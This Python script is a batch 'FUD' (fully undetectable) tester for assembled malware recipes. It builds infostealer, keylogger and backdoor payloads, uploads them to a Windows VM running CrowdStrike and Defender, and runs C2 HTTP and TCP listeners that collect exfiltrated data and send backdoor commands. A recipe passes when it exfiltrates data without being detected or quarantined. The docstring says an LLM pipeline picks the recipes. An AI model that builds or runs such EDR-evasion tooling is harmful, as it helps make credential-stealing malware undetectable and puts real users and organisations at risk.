#!/usr/bin/env python3
"""Batch FUD tester — assembles and tests recipes against CrowdStrike VM.

Uses the same assemble/deploy/verify pipeline as Hermes but drives recipe
diversity directly instead of letting the LLM pick the same recipe every time.
"""

import asyncio
import json
import logging
import os
import signal
import subprocess
import sys
import time
from datetime import datetime
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from threading import Thread, Lock

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(name)s] %(levelname)s: %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("batch_fud")

PROJECT = Path(__file__).parent.parent
ASSEMBLER = PROJECT / "templates" / "chunks" / "assembler.py"
RECIPES_DIR = PROJECT / "templates" / "chunks" / "recipes"
RESULTS_DIR = PROJECT / "results"

VM_HOST = "localhost"
VM_PORT = 10022
VM_USER = "vmuser"
VM_PASS = "vmuser123"
C2_PORT = 9001

# ── C2 HTTP Server ──────────────────────────────────────────────────
c2_data = bytearray()
c2_lock = Lock()
c2_requests = 0
c2_stop_flag = False


backdoor_mode = False
backdoor_task_idx = 0
backdoor_tasks = ["COLLECT", "CMD:whoami", "CMD:hostname", "EXIT"]


class C2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        global c2_requests
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length) if length else b""
        with c2_lock:
            c2_data.extend(body)
            c2_requests += 1
        log.info("  POST %s: %d bytes (total: %d)", self.path, len(body), len(c2_data))
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_GET(self):
        global backdoor_task_idx
        if backdoor_mode and self.path == "/task":
            with c2_lock:
                if backdoor_task_idx < len(backdoor_tasks):
                    task = backdoor_tasks[backdoor_task_idx]
                    backdoor_task_idx += 1
                else:
                    task = "EXIT"
            log.info("  GET /task → %s", task)
            resp = task.encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(resp)))
            self.end_headers()
            self.wfile.write(resp)
        else:
            self.send_response(200)
            self.send_header("Content-Length", "2")
            self.end_headers()
            self.wfile.write(b"OK")

    def log_message(self, *args):
        pass


def start_c2(port, timeout=120, is_backdoor=False):
    global c2_data, c2_requests, c2_stop_flag, backdoor_mode, backdoor_task_idx
    c2_data = bytearray()
    c2_requests = 0
    c2_stop_flag = False
    backdoor_mode = is_backdoor
    backdoor_task_idx = 0
    server = HTTPServer(("0.0.0.0", port), C2Handler)
    server.timeout = 1

    def serve():
        deadline = time.monotonic() + timeout
        while time.monotonic() < deadline and not c2_stop_flag:
            try:
                server.handle_request()
            except Exception:
                break
        try:
            server.server_close()
        except Exception:
            pass

    t = Thread(target=serve, daemon=True)
    t.start()
    return server, t


def stop_c2(server):
    global c2_stop_flag
    c2_stop_flag = True
    time.sleep(2)


# ── TCP C2 Server (for PE recipes using tcp_flush/tcp_direct) ──────
tcp_data = bytearray()
tcp_lock = Lock()
tcp_stop_flag = False


def start_tcp_c2(port, timeout=120):
    global tcp_data, tcp_stop_flag
    tcp_data = bytearray()
    tcp_stop_flag = False

    import socket
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(2)

    def serve():
        deadline = time.monotonic() + timeout
        conn = None
        try:
            while time.monotonic() < deadline and not tcp_stop_flag:
                try:
                    conn, addr = srv.accept()
                    log.info("TCP C2: connection from %s", addr)
                    conn.settimeout(5)
                    while time.monotonic() < deadline and not tcp_stop_flag:
                        try:
                            chunk = conn.recv(65536)
                            if not chunk:
                                break
                            with tcp_lock:
                                tcp_data.extend(chunk)
                        except socket.timeout:
                            continue
                    conn.close()
                    conn = None
                except socket.timeout:
                    continue
        finally:
            if conn:
                try:
                    conn.close()
                except Exception:
                    pass
            srv.close()

    t = Thread(target=serve, daemon=True)
    t.start()
    return srv, t


def stop_tcp_c2(srv):
    global tcp_stop_flag
    tcp_stop_flag = True
    time.sleep(2)


# ── Compile PE ─────────────────────────────────────────────────────
def compile_pe(source_path, output_dir):
    exe_path = output_dir / (source_path.stem.replace(".", "_") + ".exe")
    cmd = [
        "x86_64-w64-mingw32-gcc",
        "-o", str(exe_path),
        str(source_path),
        "-lws2_32", "-liphlpapi", "-lcrypt32", "-lole32",
        "-lshell32", "-lgdi32", "-lwininet", "-ldnsapi",
        "-mwindows", "-static",
    ]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
    if r.returncode != 0:
        return None, f"Compile failed: {r.stderr[:500]}"
    if exe_path.exists():
        return exe_path, None
    return None, "EXE not created"


# ── SSH helpers ─────────────────────────────────────────────────────
def ssh_exec(cmd, timeout=30):
    full = [
        "sshpass", "-p", VM_PASS,
        "ssh", "-o", "StrictHostKeyChecking=no",
        "-p", str(VM_PORT),
        f"{VM_USER}@{VM_HOST}",
        cmd,
    ]
    try:
        r = subprocess.run(full, capture_output=True, text=True, timeout=timeout)
        return r.stdout.replace("\r", ""), r.stderr, r.returncode
    except subprocess.TimeoutExpired:
        return "", "timeout", -1


def scp_upload(local, remote):
    full = [
        "sshpass", "-p", VM_PASS,
        "scp", "-o", "StrictHostKeyChecking=no",
        "-P", str(VM_PORT),
        local,
        f"{VM_USER}@{VM_HOST}:{remote}",
    ]
    return subprocess.run(full, capture_output=True, timeout=30).returncode == 0


def cleanup_vm():
    ssh_exec(
        'taskkill /f /im cscript.exe 2>nul & '
        'taskkill /f /im payload.exe 2>nul & '
        'del "C:\\Users\\vmuser\\Desktop\\*.js" 2>nul & '
        'del "C:\\Users\\vmuser\\Desktop\\*.exe" 2>nul & '
        'del "%TEMP%\\report.log" 2>nul & '
        'del "%TEMP%\\sysdata.log" 2>nul & '
        'del "%TEMP%\\~exfil.dat" 2>nul & '
        'echo CLEANUP_DONE',
        timeout=15,
    )


# ── Assemble ────────────────────────────────────────────────────────
def assemble_recipe(recipe_name, output_dir, extra_vars=None):
    recipe_path = RECIPES_DIR / f"{recipe_name}.yaml"
    if not recipe_path.exists():
        return None, f"Recipe not found: {recipe_path}"

    output_dir.mkdir(parents=True, exist_ok=True)
    if recipe_name.startswith("js_"):
        out_file = output_dir / f"{recipe_name}.js"
    else:
        out_file = output_dir / f"{recipe_name}.c"

    cmd = [
        sys.executable, str(ASSEMBLER),
        str(recipe_path),
        "-o", str(out_file),
        "--var", "C2_IP=10.0.2.2",
        "--var", "C2_PORT=9001",
    ]
    if extra_vars:
        for k, v in extra_vars.items():
            cmd.extend(["--var", f"{k}={v}"])
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    if r.returncode != 0:
        return None, f"Assemble failed: {r.stderr}"
    if out_file.exists():
        return out_file, None
    return None, "Output file not created"


# ── Test a single recipe ────────────────────────────────────────────
def find_latest_artifact(recipe_name):
    """Find the most recently assembled artifact for a recipe."""
    pattern = f"hermes_{recipe_name}_*"
    dirs = sorted(RESULTS_DIR.glob(pattern), reverse=True)
    for d in dirs:
        for ext in [".js", ".exe", ".c"]:
            artifact = d / f"{recipe_name}{ext}"
            if artifact.exists():
                return artifact, d
    return None, None


def test_recipe(recipe_name, exfil_type="http"):
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    run_dir = RESULTS_DIR / f"hermes_{recipe_name}_{ts}"

    log.info("=== Testing %s (exfil: %s) ===", recipe_name, exfil_type)

    # 1. Always assemble fresh to pick up chunk fixes
    extra_vars = {}
    if "keylogger" in recipe_name:
        extra_vars["KEYLOG_DURATION"] = "10"
        extra_vars["BATCH_DURATION_MS"] = "15000"
        extra_vars["FLUSH_INTERVAL_MS"] = "5000"
    if "backdoor" in recipe_name:
        extra_vars["BEACON_INTERVAL"] = "3000"
    artifact, err = assemble_recipe(recipe_name, run_dir, extra_vars=extra_vars)
    if err:
        log.error("Assembly failed: %s", err)
        return {"recipe": recipe_name, "verdict": "FAIL", "reason": f"assemble: {err}"}
    log.info("Assembled: %s (%d bytes)", artifact.name, artifact.stat().st_size)

    # 2. Clean VM
    cleanup_vm()
    time.sleep(1)

    # 3. Compile PE if needed
    if not recipe_name.startswith("js_"):
        exe_path, err = compile_pe(artifact, run_dir)
        if err:
            log.error("Compile failed: %s", err)
            return {"recipe": recipe_name, "verdict": "FAIL", "reason": f"compile: {err}"}
        log.info("Compiled: %s (%d bytes)", exe_path.name, exe_path.stat().st_size)
        artifact = exe_path

    # 4. Upload
    remote_name = artifact.name
    remote_path = f"C:\\Users\\{VM_USER}\\Desktop\\{remote_name}"
    if not scp_upload(str(artifact), remote_path):
        log.error("Upload failed")
        return {"recipe": recipe_name, "verdict": "FAIL", "reason": "upload failed"}
    log.info("Uploaded to VM: %s", remote_path)

    # 5. Wait for Defender to scan (2s)
    time.sleep(2)
    out, _, _ = ssh_exec(f'if exist "{remote_path}" (echo EXISTS) else (echo GONE)')
    if "GONE" in out:
        log.error("QUARANTINED by Defender/CrowdStrike on upload")
        return {"recipe": recipe_name, "verdict": "FAIL", "reason": "quarantined on upload"}

    c2_bytes = 0
    file_drop_data = b""

    if exfil_type == "tcp":
        # 5t. Start TCP C2 listener
        subprocess.run(["fuser", "-k", f"{C2_PORT}/tcp"], capture_output=True)
        time.sleep(1)
        srv, thread = start_tcp_c2(C2_PORT, timeout=180)
        time.sleep(1)
        log.info("C2 TCP listener started on :%d", C2_PORT)

        exec_cmd = f'"{remote_path}"'
        log.info("Executing: %s", exec_cmd)

        def run_ssh():
            ssh_exec(exec_cmd, timeout=180)

        ssh_thread = Thread(target=run_ssh, daemon=True)
        ssh_thread.start()

        max_wait = 150
        log.info("Waiting up to %ds for TCP C2 data...", max_wait)
        start_wait = time.monotonic()
        last_size = 0
        stable_count = 0
        while time.monotonic() - start_wait < max_wait:
            time.sleep(3)
            with tcp_lock:
                cur_size = len(tcp_data)
            if cur_size > 0:
                if cur_size == last_size:
                    stable_count += 1
                    if stable_count >= 3:
                        log.info("TCP C2 data stable at %d bytes", cur_size)
                        break
                else:
                    stable_count = 0
                    last_size = cur_size
                    log.info("  TCP receiving: %d bytes so far...", cur_size)
            elapsed = int(time.monotonic() - start_wait)
            if elapsed % 15 == 0 and elapsed > 0 and cur_size == 0:
                log.info("  Still waiting... (%ds)", elapsed)
        with tcp_lock:
            c2_bytes = len(tcp_data)
        log.info("TCP C2 data received: %d bytes", c2_bytes)
        stop_tcp_c2(srv)

    elif exfil_type in ("http", "backdoor"):
        # 5a. Start HTTP C2 listener
        is_backdoor = (exfil_type == "backdoor")
        subprocess.run(["fuser", "-k", f"{C2_PORT}/tcp"], capture_output=True)
        time.sleep(1)
        server, thread = start_c2(C2_PORT, timeout=180, is_backdoor=is_backdoor)
        time.sleep(1)
        log.info("C2 HTTP listener started on :%d%s", C2_PORT,
                 " (backdoor mode)" if is_backdoor else "")

        # 6. Execute via SSH in a background thread (foreground on VM)
        if recipe_name.startswith("js_"):
            exec_cmd = f'cscript //nologo //E:JScript "{remote_path}"'
        else:
            exec_cmd = f'"{remote_path}"'
        log.info("Executing: %s", exec_cmd)

        def run_ssh():
            ssh_exec(exec_cmd, timeout=180)

        ssh_thread = Thread(target=run_ssh, daemon=True)
        ssh_thread.start()

        # 7. Wait for C2 data (poll with timeout)
        max_wait = 150
        log.info("Waiting up to %ds for C2 data...", max_wait)
        start_wait = time.monotonic()
        last_size = 0
        stable_count = 0
        while time.monotonic() - start_wait < max_wait:
            time.sleep(3)
            with c2_lock:
                cur_size = len(c2_data)
            if cur_size > 0:
                if cur_size == last_size:
                    stable_count += 1
                    if stable_count >= 3:
                        log.info("C2 data stable at %d bytes", cur_size)
                        break
                else:
                    stable_count = 0
                    last_size = cur_size
                    log.info("  C2 receiving: %d bytes so far...", cur_size)
            elapsed = int(time.monotonic() - start_wait)
            if elapsed % 15 == 0 and elapsed > 0 and cur_size == 0:
                log.info("  Still waiting... (%ds)", elapsed)
        with c2_lock:
            c2_bytes = len(c2_data)
        log.info("C2 data received: %d bytes (%d requests)", c2_bytes, c2_requests)
        stop_c2(server)

    elif exfil_type == "file_drop":
        # 5b. Execute (foreground, blocks until done)
        if recipe_name.startswith("js_"):
            exec_cmd = f'cscript //nologo //E:JScript "{remote_path}"'
        else:
            exec_cmd = f'"{remote_path}"'
        log.info("Executing: %s", exec_cmd)
        ssh_exec(exec_cmd, timeout=180)
        time.sleep(5)

        # 6b. Retrieve dropped file
        if "creds" in recipe_name:
            drop_file = "%TEMP%\\report.log"
        elif "filedrop" in recipe_name:
            drop_file = "%TEMP%\\sysdata.log"
        else:
            drop_file = "%TEMP%\\report.log"

        out, _, _ = ssh_exec(f'type "{drop_file}" 2>nul')
        if out and len(out) > 10:
            file_drop_data = out.encode()
            c2_bytes = len(file_drop_data)
            log.info("File drop data: %d bytes", c2_bytes)
            with open(run_dir / "exfil_data.txt", "w") as f:
                f.write(out)
        else:
            log.warning("No file drop data found")

    # 8. Check binary still on disk
    out, _, _ = ssh_exec(f'if exist "{remote_path}" (echo EXISTS) else (echo GONE)')
    binary_exists = "EXISTS" in out

    # 9. Check CrowdStrike detections
    out_cs, _, _ = ssh_exec(
        'powershell -Command "'
        "$ev = Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' "
        "-FilterXPath \\\"*[System[TimeCreated[timediff(@SystemTime) <= 300000]]]\\\" "
        "-ErrorAction SilentlyContinue 2>$null; "
        "if($ev){$ev | Select-Object -First 3 | Format-List Id,Message}else{'NO_DETECTIONS'}"
        '"',
        timeout=15,
    )

    out_mpd, _, _ = ssh_exec(
        'powershell -Command "'
        "Get-MpThreatDetection -ErrorAction SilentlyContinue | "
        "Where-Object {$_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5)} | "
        'Select-Object -First 3 | Format-List"',
        timeout=15,
    )

    cs_clean = "NO_DETECTIONS" in out_cs or not out_cs.strip()
    mpd_clean = not out_mpd.strip() or "InitialDetectionTime" not in out_mpd

    # 10. Check CrowdStrike Falcon specifically
    out_falcon, _, _ = ssh_exec(
        'powershell -Command "'
        "Get-WinEvent -LogName 'CrowdStrike-Falcon' -MaxEvents 5 "
        "-ErrorAction SilentlyContinue | "
        "Where-Object {$_.TimeCreated -gt (Get-Date).AddMinutes(-5)} | "
        'Format-List Id,Message"',
        timeout=15,
    )
    falcon_clean = not out_falcon.strip()

    detections = 0
    if not cs_clean:
        detections += 1
    if not mpd_clean:
        detections += 1

    # Verdict
    if c2_bytes > 100 and binary_exists and detections == 0:
        verdict = "PASS"
    else:
        verdict = "FAIL"

    reasons = []
    if c2_bytes <= 100:
        reasons.append(f"no C2 data ({c2_bytes} bytes)")
    if not binary_exists:
        reasons.append("binary quarantined")
    if detections > 0:
        reasons.append(f"{detections} detection(s)")
    reason = "; ".join(reasons) if reasons else "success"

    # Save C2 data
    if exfil_type == "http" and c2_bytes > 0:
        with open(run_dir / "c2_capture.bin", "wb") as f:
            f.write(bytes(c2_data))
    elif exfil_type == "tcp" and c2_bytes > 0:
        with open(run_dir / "c2_capture.bin", "wb") as f:
            f.write(bytes(tcp_data))

    result = {
        "recipe": recipe_name,
        "verdict": verdict,
        "reason": reason,
        "c2_bytes": c2_bytes,
        "binary_exists": binary_exists,
        "detections": detections,
        "exfil_type": exfil_type,
        "artifact_size": artifact.stat().st_size,
        "timestamp": ts,
        "result_dir": str(run_dir),
    }

    log.info(
        "%s: %s — %s (%d bytes, binary=%s, detections=%d)",
        recipe_name, verdict, reason, c2_bytes, binary_exists, detections,
    )

    # Save result metadata
    with open(run_dir / "test_result.json", "w") as f:
        json.dump(result, f, indent=2)

    return result


# ── Main ────────────────────────────────────────────────────────────
RECIPES = {
    # HTTP-based exfil (standard C2 listener)
    "js_infostealer_full": "http",
    "js_infostealer_stealth": "http",
    "js_infostealer_staged": "http",
    "js_infostealer_paced": "http",
    "js_infostealer_ad": "http",
    "js_infostealer_crypto": "http",
    "js_infostealer_curl": "http",
    # File drop exfil (retrieve via SSH)
    "js_infostealer_creds": "file_drop",
    "js_infostealer_filedrop": "file_drop",
}


def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--recipes", nargs="*", help="Specific recipes to test")
    parser.add_argument("--type", default="infostealer", help="Malware type filter")
    parser.add_argument("--skip-proven", action="store_true", help="Skip already-proven recipes")
    args = parser.parse_args()

    recipes = {}
    if args.recipes:
        for r in args.recipes:
            if r in RECIPES:
                recipes[r] = RECIPES[r]
            elif "backdoor" in r:
                recipes[r] = "backdoor"
            else:
                recipes[r] = "http"
    else:
        recipes = dict(RECIPES)

    # Check VM alive
    out, _, _ = ssh_exec("echo VM_ALIVE")
    if "VM_ALIVE" not in out:
        log.error("VM not reachable!")
        sys.exit(1)

    # Check CrowdStrike running
    out, _, _ = ssh_exec(
        'powershell -Command "Get-Service csfalconservice -ErrorAction SilentlyContinue | '
        'Select-Object -ExpandProperty Status"'
    )
    log.info("CrowdStrike: %s", out.strip())

    results = []
    passes = []
    fails = []

    for recipe, exfil in recipes.items():
        try:
            result = test_recipe(recipe, exfil)
            results.append(result)
            if result["verdict"] == "PASS":
                passes.append(result)
            else:
                fails.append(result)
        except Exception as e:
            log.exception("Error testing %s", recipe)
            results.append({"recipe": recipe, "verdict": "ERROR", "reason": str(e)})

        cleanup_vm()
        time.sleep(3)

    # Summary
    print("\n" + "=" * 60)
    print(f"BATCH TEST SUMMARY — {len(results)} recipes tested")
    print("=" * 60)
    print(f"\nPASS: {len(passes)}")
    for r in passes:
        print(f"  ✓ {r['recipe']} — {r['c2_bytes']} bytes, {r['artifact_size']} byte artifact")
    print(f"\nFAIL: {len(fails)}")
    for r in fails:
        print(f"  ✗ {r['recipe']} — {r['reason']}")

    # Save summary
    summary_path = RESULTS_DIR / "batch_test_results.json"
    with open(summary_path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\nResults saved: {summary_path}")


if __name__ == "__main__":
    main()
